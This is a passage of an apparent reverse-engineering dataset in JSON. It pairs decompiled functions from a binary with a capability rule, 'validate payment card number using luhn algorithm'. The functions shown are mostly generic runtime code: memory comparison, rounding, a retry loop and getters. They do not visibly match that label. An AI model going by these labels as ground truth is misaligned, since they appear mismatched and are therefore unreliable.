+ -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1e);\n                    uVar1 = *(arg_ch + arg_10h + -0x1e);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1d);\n                    uVar1 = *(arg_ch + arg_10h + -0x1d);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x1c) - *(arg_ch + arg_10h + -0x1c);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x00413fe0:\n                uVar1 = *(arg_8h + arg_10h + -0x1b);\n                if (uVar1 == *(arg_ch + arg_10h + -0x1b)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x1b);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1a);\n                    uVar1 = *(arg_ch + arg_10h + -0x1a);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x19);\n                    uVar1 = *(arg_ch + arg_10h + -0x19);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x18) - *(arg_ch + arg_10h + -0x18);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0041406f:\n                uVar1 = *(arg_8h + arg_10h + -0x17);\n                if (uVar1 == *(arg_ch + arg_10h + -0x17)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x17);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x16);\n                    uVar1 = *(arg_ch + arg_10h + -0x16);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x15);\n                    uVar1 = *(arg_ch + arg_10h + -0x15);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x14) - *(arg_ch + arg_10h + -0x14);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x004140fe:\n                uVar1 = *(arg_8h + arg_10h + -0x13);\n                if (uVar1 == *(arg_ch + arg_10h + -0x13)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x13);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x12);\n                    uVar1 = *(arg_ch + arg_10h + -0x12);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x11);\n                    uVar1 = *(arg_ch + arg_10h + -0x11);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x10) - *(arg_ch + arg_10h + -0x10);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0041418d:\n                if (*(arg_8h + arg_10h + -0xf) == *(arg_ch + arg_10h + -0xf)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = *(arg_ch + arg_10h + -0xf);\n                    uVar2 = *(arg_8h + arg_10h + -0xf);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xe);\n                    uVar1 = *(arg_ch + arg_10h + -0xe);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xd);\n                    uVar1 = *(arg_ch + arg_10h + -0xd);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0xc) - *(arg_ch + arg_10h + -0xc);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0041421d:\n                uVar1 = *(arg_8h + arg_10h + -0xb);\n                if (uVar1 == *(arg_ch + arg_10h + -0xb)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0xb);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -10);\n                    uVar1 = *(arg_ch + arg_10h + -10);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -9);\n                    uVar1 = *(arg_ch + arg_10h + -9);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -8) - *(arg_ch + arg_10h + -8);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x004142ac:\n                uVar1 = *(arg_8h + arg_10h + -7);\n                if (uVar1 == *(arg_ch + arg_10h + -7)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -7);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -6);\n                    uVar1 = *(arg_ch + arg_10h + -6);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -5);\n                    uVar1 = *(arg_ch + arg_10h + -5);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -4) - *(arg_ch + arg_10h + -4);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0041433b:\n                uVar2 = *(arg_8h + arg_10h + -3);\n                uVar1 = *(arg_ch + arg_10h + -3);\n                if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                    return iVar3;\n                }\n                goto code_r0x00413f28;\n            default:\n                goto code_r0x00412ebb;\n            }\n            return 0;\n        }\n        uVar1 = *arg_8h;\n        uVar2 = *arg_ch;\n        if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar1 = *(arg_8h + 1);\n        uVar2 = *(arg_ch + 1);\n        if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar1 = *(arg_8h + 2);\n        uVar2 = *(arg_ch + 2);\n        if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar1 = *(arg_8h + 3);\n        uVar2 = *(arg_ch + 3);\n    }\n    iVar3 = uVar1 - uVar2;\n    if (iVar3 != 0) {\n        iVar3 = (0 < iVar3) * 2 + -1;\n    }\n    return iVar3;\ncode_r0x00412ebb:\n    if (*arg_8h == *arg_ch) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = *arg_8h;\n        uVar1 = *arg_ch;\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 1);\n        uVar1 = *(arg_ch + 1);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 2);\n        uVar1 = *(arg_ch + 2);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + 3) - *(arg_ch + 3);\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    if (arg_8h[1] == arg_ch[1]) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = *(arg_8h + 1);\n        uVar1 = *(arg_ch + 1);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 5);\n        uVar1 = *(arg_ch + 5);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 6);\n        uVar1 = *(arg_ch + 6);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + 7) - *(arg_ch + 7);\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    if (arg_8h[2] == arg_ch[2]) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = *(arg_8h + 2);\n        uVar1 = *(arg_ch + 2);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 9);\n        uVar1 = *(arg_ch + 9);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 10);\n        uVar1 = *(arg_ch + 10);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + 0xb) - *(arg_ch + 0xb);\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    if (arg_8h[3] == arg_ch[3]) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = *(arg_8h + 3);\n        uVar1 = *(arg_ch + 3);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0xd);\n        uVar1 = *(arg_ch + 0xd);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0xe);\n        uVar1 = *(arg_ch + 0xe);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + 0xf) - *(arg_ch + 0xf);\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    if (arg_8h[4] == arg_ch[4]) {\n        iVar3 = 0;\n    }\n    else {\n        uVar1 = *(arg_ch + 4);\n        uVar2 = *(arg_8h + 4);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0x11);\n        uVar1 = *(arg_ch + 0x11);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0x12);\n        uVar1 = *(arg_ch + 0x12);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + 0x13) - *(arg_ch + 0x13);\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    if (arg_8h[5] == arg_ch[5]) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = *(arg_8h + 5);\n        uVar1 = *(arg_ch + 5);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0x15);\n        uVar1 = *(arg_ch + 0x15);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0x16);\n        uVar1 = *(arg_ch + 0x16);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + 0x17) - *(arg_ch + 0x17);\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    if (arg_8h[6] == arg_ch[6]) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = *(arg_8h + 6);\n        uVar1 = *(arg_ch + 6);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0x19);\n        uVar1 = *(arg_ch + 0x19);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0x1a);\n        uVar1 = *(arg_ch + 0x1a);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + 0x1b) - *(arg_ch + 0x1b);\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    if (arg_8h[7] == arg_ch[7]) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = *(arg_8h + 7);\n        uVar1 = *(arg_ch + 7);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0x1d);\n        uVar1 = *(arg_ch + 0x1d);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0x1e);\n        uVar1 = *(arg_ch + 0x1e);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + 0x1f) - *(arg_ch + 0x1f);\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    arg_8h = arg_8h + 8;\n    arg_ch = arg_ch + 8;\n    arg_10h = arg_10h + -0x20;\n    goto code_r0x0041332d;\n}\n",
        "token_count": 16484
    },
    "004147f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.004147f6(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    float fVar4;\n    float10 in_ST0;\n    uint32_t uStack32;\n    float fStack28;\n    \n    uVar1 = ROUND(in_ST0);\n    uStack32 = uVar1;\n    fStack28 = uVar1 >> 0x20;\n    fVar4 = in_ST0;\n    if ((uStack32 != 0) || (fVar4 = fStack28,  (uVar1 & 0x7fffffff00000000) != 0)) {\n        if (fVar4 < 0) {\n            uVar2 = 0x80000000 < (in_ST0 - uVar1 ^ 0x80000000);\n            bVar3 = CARRY4(uStack32, uVar2);\n            uStack32 = uStack32 + uVar2;\n            fStack28 = fStack28 + bVar3;\n        }\n        else {\n            uVar2 = 0x80000000 < in_ST0 - uVar1;\n            bVar3 = uStack32 < uVar2;\n            uStack32 = uStack32 - uVar2;\n            fStack28 = fStack28 - bVar3;\n        }\n    }\n    return CONCAT44(fStack28, uStack32);\n}\n",
        "token_count": 306
    },
    "00414fff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414fff(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 1000;\n    do {\n        uVar1 = func_0x00696ca3(uVar3, uVar3);\n        iVar2 = func_0x0071787e(uVar1, arg_8h);\n        uVar3 = uVar3 + 1000;\n        if (60000 < uVar3) {\n            return;\n        }\n    } while (iVar2 == 0);\n    return;\n}\n",
        "token_count": 136
    },
    "004150ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004150ca(code **arg_8h, code **arg_ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    while ((arg_8h < arg_ch && (iVar1 == 0))) {\n        if (*arg_8h != NULL) {\n            iVar1 = (**arg_8h)();\n        }\n        arg_8h = arg_8h + 1;\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0041529f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041529f(uint arg_8h)\n\n{\n    fcn.00415173(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 40
    },
    "0041aafa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041aafa(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if (arg_8h < 0x14) {\n        fcn.00415f91(arg_8h + 0x10);\n        *(arg_ch + 0xc) = *(arg_ch + 0xc) | 0x8000;\n        return;\n    }\n    fcn.006f70b1();\n    return;\n}\n",
        "token_count": 102
    },
    "0041ab68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ab68(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if (arg_8h < 0x14) {\n        *(arg_ch + 0xc) = *(arg_ch + 0xc) & 0xffff7fff;\n        fcn.00415eb7(arg_8h + 0x10);\n        return;\n    }\n    fcn.0048bf30(arg_ch + 0x20, arg_ch + 0x20);\n    return;\n}\n",
        "token_count": 116
    },
    "0041d316": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041d316(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (arg_8h == NULL) {\n        puVar1 = fcn.004125de();\n        *puVar1 = 0x16;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        uVar2 = 0x16;\n    }\n    else {\n        *arg_8h = *0x43685c;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 137
    },
    "0041d34f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041d34f(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (arg_8h == NULL) {\n        puVar1 = fcn.004125de();\n        *puVar1 = 0x16;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        uVar2 = 0x16;\n    }\n    else {\n        *arg_8h = *0x436860;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 137
    },
    "0041d388": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041d388(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (arg_8h == NULL) {\n        puVar1 = fcn.004125de();\n        *puVar1 = 0x16;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        uVar2 = 0x16;\n    }\n    else {\n        *arg_8h = *0x436858;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 136
    },
    "0041d949": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0041d949(void)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint arg_14h;\n    int32_t *unaff_EDI;\n    uint32_t uVar6;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    iVar2 = fcn.0041d316(&var_4h);\n    if (iVar2 != 0) {\n        fcn.00415914(0, 0, 0, 0, 0);\n    }\n    if (var_4h == 0) {\n        return false;\n    }\n    iVar2 = unaff_EDI[5];\n    if ((iVar2 != *0x4368f0) || (iVar2 != *0x4368fc)) {\n        if (*0x439b1c == 0) {\n            var_8h = 1;\n            arg_14h = 2;\n            if (iVar2 < 0x6b) {\n                var_8h = 5;\n                arg_14h = 1;\n            }\n            fcn.0041d752(1, 1, iVar2, arg_14h, 0, 0, 0, 0, 0);\n            fcn.0041d752(0, 1, unaff_EDI[5], var_8h, 0, 0, 0, 0, 0);\n        }\n        else {\n            if (*0x439b08 != 0) {\n                uVar6 = *0x439b0e;\n                uVar3 = 0;\n                uVar4 = 0;\n            }\n            else {\n                uVar3 = *0x439b0c;\n                uVar6 = 0;\n                uVar4 = *0x439b0e;\n            }\n            fcn.0041d752(1, *0x439b08 == 0, iVar2, uVar4, uVar3, uVar6, *0x439b12, *0x439b14, *0x439b16);\n            if (*0x439ab4 != 0) {\n                uVar6 = *0x439aba;\n                uVar3 = 0;\n                uVar4 = 0;\n                iVar2 = unaff_EDI[5];\n            }\n            else {\n                uVar3 = *0x439ab8;\n                uVar6 = 0;\n                uVar4 = *0x439aba;\n                iVar2 = unaff_EDI[5];\n            }\n            fcn.0041d752(0, *0x439ab4 == 0, iVar2, uVar4, uVar3, uVar6, *0x439abe, *0x439ac0, *0x439ac2);\n        }\n    }\n    iVar2 = unaff_EDI[7];\n    if (*0x4368f4 < *0x436900) {\n        if ((iVar2 < *0x4368f4) || (*0x436900 < iVar2)) {\n            return false;\n        }\n        if ((*0x4368f4 < iVar2) && (iVar2 < *0x436900)) {\n            return true;\n        }\n    }\n    else {\n        if (iVar2 < *0x436900) {\n            return true;\n        }\n        if (*0x4368f4 < iVar2) {\n            return true;\n        }\n        if ((*0x436900 < iVar2) && (iVar2 < *0x4368f4)) {\n            return false;\n        }\n    }\n    iVar5 = ((unaff_EDI[2] * 0x3c + unaff_EDI[1]) * 0x3c + *unaff_EDI) * 1000;\n    if (iVar2 == *0x4368f4) {\n        bVar1 = *0x4368f8 <= iVar5;\n    }\n    else {\n        bVar1 = iVar5 < *0x436904;\n    }\n    return bVar1;\n}\n",
        "token_count": 929
    },
    "0041dc72": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041dc72(uint32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (arg_8h == 0) {\n        return 1;\n    }\n    arg_8h = CONCAT12(0x5c, CONCAT11(0x3a, arg_8h + '@'));\n    uVar1 = fcn.005fb928(&arg_8h);\n    return uVar1;\n}\n",
        "token_count": 99
    },
    "0041dde2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041dde2(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004146d8(0x433040, 0xc);\n    fcn.00415f91(7);\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.0041dcab(0, *(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0041de22();\n    fcn.0041471d();\n    return;\n}\n",
        "token_count": 201
    },
    "0041fb60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0041fb60(void)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    uint32_t uVar24;\n    uint32_t uVar25;\n    uint32_t uVar26;\n    uint32_t uVar27;\n    uint32_t uVar28;\n    uint32_t uVar29;\n    uint32_t uVar30;\n    uint32_t uVar31;\n    uint32_t uVar32;\n    uint32_t uVar33;\n    uint32_t uVar34;\n    uint32_t uVar35;\n    uint32_t uVar36;\n    uint32_t uVar37;\n    uint32_t uVar38;\n    uint32_t uVar39;\n    uint32_t uVar40;\n    uint32_t uVar41;\n    uint32_t uVar42;\n    uint32_t uVar43;\n    uint32_t uVar44;\n    uint32_t uVar45;\n    int32_t unaff_ESI;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x42);\n    var_8h = 